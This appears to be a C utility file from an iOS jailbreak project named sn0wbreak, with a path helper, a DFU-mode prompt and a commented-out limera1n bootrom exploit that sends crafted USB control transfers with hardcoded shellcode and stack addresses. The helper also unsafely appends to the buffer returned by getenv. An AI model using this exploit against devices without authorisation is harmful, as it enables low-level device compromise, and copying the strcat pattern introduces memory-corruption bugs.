// utility file of the sn0wbreak project

#include <libusb-1.0/libusb.h>

// this is the info function
bool q = false;
#define INFO(x...) \
if (!q) { printf("[*] "), printf(x); }

// this function is for getting filenames like $HOME/.sn0wbreak/onefi.le

char *sbfile(char *filename) // tested, worx
{
  /* example usage:
  char *testfile = sbfile("res.zip");
  printf("%s",testfile);
 */
  char *homedir = getenv("HOME");
  char *file = strcat(homedir, "/.sn0wbreak/");
  file = strcat(file, filename);
  return file;
}


// DFU mode function
void dfu_init(void)
{
    INFO("Put your device in DFU.\n if you do not know what DFU mode is do not attempt this\n");
    sleep(260);
    INFO("device should be in DFU mode by now\n");
    INFO("Done\n");
}

/*
int limera1n(void)
{
    irecv_error_t error = IRECV_E_SUCCESS;
    unsigned int i = 0;
    unsigned char buf[0x800];
    unsigned char shellcode[0x800];
    unsigned int max_size = 0x24000;
    unsigned int stack_address = 0x84033F98;
    unsigned int shellcode_address = 0x84023001;

    if (device->chip_id == 8930)
    {
        max_size = 0x2C000;
        stack_address = 0x8403BF9C;
        shellcode_address = 0x8402B001;
    }
    if (device->chip_id == 8920)
    {
        max_size = 0x24000;
        stack_address = 0x84033FA4;
        shellcode_address = 0x84023001;
    }

    memset(shellcode, 0x0, 0x800);
    memcpy(shellcode, Payload, sizeof(Payload));


    info("Resetting device counters\n");
    error = irecv_reset_counters(client);
    if (error != IRECV_E_SUCCESS)
    {
        DPRINT("%s\n", irecv_strerror(error));
        return -1;
    }

    memset(buf, 0xCC, 0x800);
    for (i = 0; i < 0x800; i += 0x40)
    {
        unsigned int *heap = (unsigned int *)(buf + i);
        heap[0] = 0x405;
        heap[1] = 0x101;
        heap[2] = shellcode_address;
        heap[3] = stack_address;
    }

    info("Sending chunk headers\n");
    irecv_control_transfer(client, 0x21, 1, 0, 0, buf, 0x800, 1000);

    memset(buf, 0xCC, 0x800);
    for (i = 0; i < (max_size - (0x800 * 3)); i += 0x800)
    {
        irecv_control_transfer(client, 0x21, 1, 0, 0, buf, 0x800, 1000);
    }

    info("Sending exploit payload\n");
    irecv_control_transfer(client, 0x21, 1, 0, 0, shellcode, 0x800, 1000);

    info("Sending fake data\n");
    memset(buf, 0xBB, 0x800);
    irecv_control_transfer(client, 0xA1, 1, 0, 0, buf, 0x800, 1000);
    irecv_control_transfer(client, 0x21, 1, 0, 0, buf, 0x800, 10);

    info("Executing exploit\n");
    irecv_control_transfer(client, 0x21, 2, 0, 0, buf, 0, 1000);
    irecv_reset(client);
    irecv_finish_transfer(client);

    info("Exploit sent\n");

    info("Reconnecting to device\n");
    client = irecv_reconnect(client, 2);
    if (client == NULL)
    {
        info("%s\n", irecv_strerror(error));
        info("Unable to reconnect\n");
        return -1;
    }
    return 0;
}
*/
